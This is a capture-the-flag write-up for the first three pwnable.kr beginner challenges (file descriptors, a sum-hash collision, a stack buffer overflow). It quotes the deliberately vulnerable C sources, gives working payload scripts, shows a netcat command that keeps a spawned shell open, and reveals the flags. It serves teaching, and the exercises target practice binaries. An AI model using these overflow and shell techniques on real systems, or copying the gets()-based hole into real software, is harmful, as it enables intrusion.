# The Write Up for Toddler's Bottle Level

## Introduction

This is the first level of the [pwnable.kr](http://pwnable.kr/) practices. All in all, the problems in this level provide a very good introduction to CTF beginners.

-
### fd

In the Linux environment, file descriptor (FD), which is an unsigned integer,is used in FILE I/O. In the header file \<unistd.h\>:

	0 is STDIN_FILENO, which is the standard input.
	1 is STDOUT_FILENO, which is the standard output.
	2 is STDERR_FILENO, which is the standard error.

The vulnerable c source code is followed.

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
	if(argc<2){
		printf("pass argv[1] a number\n");
		return 0;
	}
	int fd = atoi( argv[1] ) - 0x1234;
	int len = 0;
	len = read(fd, buf, 32);
	if(!strcmp("LETMEWIN\n", buf)){
		printf("good job :)\n");
		system("/bin/cat flag");
		exit(0);
	}
	printf("learn about Linux file IO\n");
	return 0;

}
``` 

If argv[1] is set as 4660 (0x1234), the variable fd will be 0, which is the standard input. And then, we just got the flag when we input `LETMEWIN` on the screen.

-

`mommy! I think I know what a file descriptor is!!`

-

### collision

The design of a hash function should consider the collision. In this task, the hash function is a simple sum function. The source code is followed.

```
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
	int* ip = (int*)p;
	int i;
	int res=0;
	for(i=0; i<5; i++){
		res += ip[i];
	}
	return res;
}

int main(int argc, char* argv[]){
	if(argc<2){
		printf("usage : %s [passcode]\n", argv[0]);
		return 0;
	}
	if(strlen(argv[1]) != 20){
		printf("passcode length should be 20 bytes\n");
		return 0;
	}

	if(hashcode == check_password( argv[1] )){
		system("/bin/cat flag");
		return 0;
	}
	else
		printf("wrong passcode.\n");
	return 0;
}
```

The destination hash value is 0x21DD09EC, which should be the sum of five unsigned 32bit integers. The integers should not contain '\x00' byte. So that we chose numbers as followed python code, which is stored in the path `/tmp/ex.py` and then print it.

```
#!/usr/bin/env python
import sys

"""
5 32bit integer:
0x01010101
0x01010101
0x01010101
0x01010101
0x1dd905e8
sum: 0x21DD09EC
"""
val = '\x01\x01\x01\x01'*4+'\xe8\x05\xd9\x1d'

sys.stdout.write(val)
```

Then this command will show us the flag.

```
./col `python /tmp/ex.py`
```

-

`daddy! I just managed to create a hash collision :)`

-

### bof

This is a basic buffer overflow task, but the difficulty may be existed in comunication to the server. If you receive the following message

`*** stack smashing detected ***: /home/bof/bof terminated`

Please just try shell command in this way in your local shell:

``
(python ex.py ; cat - )  |  nc pwnable.kr 9000
``

The command `cat -` will receive response of the new shell, and make sure the system() will not finish too quick.

The vulnerable source code is followed.

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

And the content of the ex.py is followed.

```
#!/usr/bin/env python

import sys

PRE="A"*0x34
SIGN='\xbe\xba\xfe\xca'
OUT=PRE+SIGN
print(OUT)
```

It maybe a little bit difficult to calaculate the distant between the address of `key` and the address of `overflowme`. The easies way is to differ two address of them in GDB. The distant is 0x34 in this case.

The flag is followed.

-
`daddy, I just pwned a buFFer :)`

-
